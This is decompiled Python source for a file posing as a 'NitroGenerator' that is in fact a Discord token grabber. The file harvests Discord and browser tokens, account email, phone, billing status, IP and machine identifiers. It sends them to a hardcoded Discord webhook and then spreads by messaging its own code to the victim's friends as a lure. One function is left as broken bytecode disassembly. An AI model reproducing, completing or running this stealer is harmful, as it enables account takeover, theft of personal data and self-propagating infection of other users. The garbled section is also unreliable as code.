# [GCC 7.5.0]
# Warning: this version of Python has problems handling the Python 3 "byte" type in constants properly.
# Embedded file name: NitroGenerator.py
import os
if os.name != 'nt':
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')
PATHS = {'Discord':ROAMING + '\\Discord', 
 'Discord Canary':ROAMING + '\\discordcanary', 
 'Discord PTB':ROAMING + '\\discordptb', 
 'Google Chrome':LOCAL + '\\Google\\Chrome\\User Data\\Default', 
 'Opera':ROAMING + '\\Opera Software\\Opera Stable', 
 'Brave':LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 
 'Yandex':LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'}

def getheaders(token=None, content_type='application/json'):
    headers = {'Content-Type':content_type, 
     'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
    if token:
        headers.update({'Authorization': token})
    return headers


def getuserdata(token):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me', headers=(getheaders(token)))).read().decode())
    except:
        pass


def gettokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log'):
            if not file_name.endswith('.ldb'):
                continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore').readlines() if x.strip()]:
            for regex in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}'):
                for token in findall(regex, line):
                    tokens.append(token)

    return tokens


def getdeveloper():
    dev = 'wodx'
    try:
        dev = urlopen(Request('https://pastebin.com/raw/ssFxiejv')).read().decode()
    except:
        pass

    return dev


def getip():
    ip = 'None'
    try:
        ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
    except:
        pass

    return ip


def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]

    return url


def gethwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]


def getfriends(token):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/relationships', headers=(getheaders(token)))).read().decode())
    except:
        pass


def getchat(token, uid):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/channels', headers=(getheaders(token)), data=(dumps({'recipient_id': uid}).encode()))).read().decode())['id']
    except:
        pass


def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=(getheaders(token)))).read().decode())) > 0)
    except:
        pass


def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=(getheaders(token, 'multipart/form-data; boundary=---------------------------325414537030329320151394843687')), data=(form_data.encode()))).read().decode()
    except:
        pass

// spread a message to the friends as lure
def spread--- This code section failed: ---

 L.  93         0  LOAD_CONST               None
                2  RETURN_VALUE     

 L.  94         4  FOR_ITER             84  'to 84'
                6  STORE_FAST               'friend'

 L.  95         8  SETUP_EXCEPT         40  'to 40'

 L.  96        10  LOAD_GLOBAL              getchat
               12  LOAD_FAST                'token'
               14  LOAD_FAST                'friend'
               16  LOAD_STR                 'id'
               18  BINARY_SUBSCR    
               20  CALL_FUNCTION_2       2  '2 positional arguments'
               22  STORE_FAST               'chat_id'

 L.  97        24  LOAD_GLOBAL              send_message
               26  LOAD_FAST                'token'
               28  LOAD_FAST                'chat_id'
               30  LOAD_FAST                'form_data'
               32  CALL_FUNCTION_3       3  '3 positional arguments'
               34  POP_TOP          
               36  POP_BLOCK        
               38  JUMP_FORWARD         74  'to 74'
             40_0  COME_FROM_EXCEPT      8  '8'

 L.  98        40  DUP_TOP          
               42  LOAD_GLOBAL              Exception
               44  COMPARE_OP               exception-match
               46  POP_JUMP_IF_FALSE    72  'to 72'
               48  POP_TOP          
               50  STORE_FAST               'e'
               52  POP_TOP          
               54  SETUP_FINALLY        60  'to 60'

 L.  99        56  POP_BLOCK        
               58  LOAD_CONST               None
             60_0  COME_FROM_FINALLY    54  '54'
               60  LOAD_CONST               None
               62  STORE_FAST               'e'
               64  DELETE_FAST              'e'
               66  END_FINALLY      
               68  POP_EXCEPT       
               70  JUMP_FORWARD         74  'to 74'
             72_0  COME_FROM            46  '46'
               72  END_FINALLY      
             74_0  COME_FROM            70  '70'
             74_1  COME_FROM            38  '38'

 L. 100        74  LOAD_GLOBAL              sleep
               76  LOAD_FAST                'delay'
               78  CALL_FUNCTION_1       1  '1 positional argument'
               80  POP_TOP          
               82  JUMP_BACK             4  'to 4'
               84  POP_BLOCK        

Parse error at or near `FOR_ITER' instruction at offset 4




def main():
    cache_path = ROAMING + '\\.cache~$'
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv('UserName')
    pc_name = os.getenv('COMPUTERNAME')
    user_path_name = os.getenv('userprofile').split('\\')[2]
    developer = getdeveloper()
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith('mfa.'):
                try:
                    uid = b64decode(token.split('.')[0].encode()).decode()
                except:
                    pass

                if uid:
                    if uid in working_ids:
                        continue
                user_data = getuserdata(token)
                if not user_data:
                    continue
                working_ids.append(uid)
                working.append(token)
                username = user_data['username'] + '#' + str(user_data['discriminator'])
                user_id = user_data['id']
                avatar_id = user_data['avatar']
                avatar_url = getavatar(user_id, avatar_id)
                email = user_data.get('email')
                phone = user_data.get('phone')
                nitro = bool(user_data.get('premium_type'))
                billing = bool(has_payment_methods(token))
                embed = {'color':7506394, 
                 'fields':[
                  {'name':'**INFO COMPTE**', 
                   'value':f"Email: {email}u'\nNum\xe9ro: '{phone}\nNitro: {nitro}\nBilling Info: {billing}", 
                   'inline':True},
                  {'name':'**PC Info**', 
                   'value':f"IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}", 
                   'inline':True},
                  {'name':'**Token**', 
                   'value':token, 
                   'inline':False}], 
                 'author':{'name':f"{username} ({user_id})", 
                  'icon_url':avatar_url}, 
                 'footer':{'text': 'Token grabber by skymod-off#3344'}}
                embeds.append(embed)

    with open(cache_path, 'a') as (file):
        for token in checked:
            if token not in already_cached_tokens:
                file.write(token + '\n')

    if len(working) == 0:
        working.append('123')
    webhook = {'content':'',  'embeds':embeds, 
     'username':'Discord Token Grabber', 
     'avatar_url':'https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png'}
    try:
        urlopen(Request('https://discord.com/api/webhooks/812114070140354591/R-M-hci0u3uKI1eN3m6pAPo9lfOz-PZ_CNu77W9ofkLjluSTF_cXtf1-mCaILRp3RsMS', data=(dumps(webhook).encode()), headers=(getheaders())))
    except:
        pass

    if self_spread:
        for token in working:
            with open((argv[0]), encoding='utf-8') as (file):
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7.5)).start()


try:
    main()
except Exception as e:
    try:
        print(e)
    finally:
        e = None
        del e
